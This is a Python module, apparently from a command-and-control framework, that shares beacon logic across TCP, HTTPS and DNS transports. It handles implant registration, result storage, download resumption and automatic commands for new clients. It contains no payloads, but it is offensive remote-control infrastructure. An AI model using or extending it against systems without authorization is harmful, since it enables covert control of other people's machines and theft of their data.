"""server/sessions/engine.py — 共享 beacon 周期逻辑（TCP/HTTPS/DNS 三传输共用）。

此前 register / 结果落库 / auto_commands / 结果处理器 在 BeaconSession 与
HTTPS/DNS 传输里各写一份，导致元数据（via/fork/shell）在非 TCP 通道丢失、
结果处理器（download 自动续传）在非 TCP 通道失效。这里收敛成单一实现。
"""

import json
import threading

from server.core.events import EVT_CONNECT, EVT_TASK_RESULT
from server.core.log import get_logger
from server.client_manager import TaskResult

logger = get_logger("beacon_engine")


class InFlight:
    """stateless 传输的任务在途登记：task_id → (result_processor, proc_arg)。

    HTTPS/DNS 是无状态轮询：task 弹出即弃，result 在后续独立请求里回来，
    需要记住每个 task 的结果处理器信息才能跑结果处理器（download 续传）。
    """

    def __init__(self):
        self._d = {}
        self._lock = threading.Lock()

    def track(self, task) -> None:
        if getattr(task, "result_processor", ""):
            with self._lock:
                self._d[task.task_id] = (task.result_processor,
                                         getattr(task, "proc_arg", ""))

    def take(self, task_id: str) -> tuple:
        with self._lock:
            return self._d.pop(task_id, ("", ""))


def register_beacon(reg: dict, mgr, events) -> tuple:
    """注册 + via/fork/shell 标记 + 上线事件。返回 (client_id, is_new)。"""
    client_id = reg["id"]
    via = reg.get("via", "")
    is_fork = bool(reg.get("fork", False))
    is_shell = bool(reg.get("shell", False))
    client_id, is_new = mgr.register(client_id, is_client=False)
    rec = mgr.get_client(client_id)
    if rec:
        rec.via = via            # 无条件覆盖：直连注册帧无 via → 清空（准确反映当前通道）
        if is_fork:
            rec.is_fork = True
        rec.is_shell = is_shell
        rec.active = True
    events.emit(EVT_CONNECT, client_id, first=bool(is_new), via=via or None,
                fork=is_fork or None, shell=is_shell or None)
    return client_id, is_new


def store_result(client_id, task_id, output, error, mgr, events,
                 max_result_size, smods=None, dispatcher=None,
                 result_processor="", proc_arg=""):
    """结果截断 + 落库 + 事件 + 结果处理器（三传输共用）。"""
    if len(output) > max_result_size:
        output = (output[:max_result_size]
                  + f"\n... (truncated, {len(output)} bytes total)")
    mgr.add_result(client_id, TaskResult(task_id=task_id, output=output,
                                         error=error))
    events.emit(EVT_TASK_RESULT, client_id, task_id=task_id,
                output=output[:200])
    if result_processor and smods is not None:
        try:
            out = smods.run(result_processor,
                            [output, error, proc_arg, dispatcher, client_id])
        except Exception as e:
            logger.warning("result processor %s failed: %s",
                           result_processor, e)
            return
        try:
            fields = json.loads(out)
        except ValueError:
            return
        if isinstance(fields, dict) and fields:
            mgr.update_metadata(client_id, fields)


def build_auto_tasks(commands, client_id, dispatcher) -> list:
    """把 auto_commands 配置构建成任务列表（构建失败告警跳过）。"""
    tasks = []
    if not commands or not dispatcher:
        return tasks
    for cmd_str in commands:
        cmd_str = cmd_str.strip()
        if not cmd_str:
            continue
        parts = cmd_str.split()
        name, args = parts[0], parts[1:]
        try:
            task = dispatcher.build_task_for(client_id, name, args)
        except ValueError as e:
            logger.warning("auto command '%s' build failed: %s", name, e)
            continue
        if task is None:
            logger.warning("auto command module not found: %s", name)
            continue
        tasks.append(task)
    return tasks
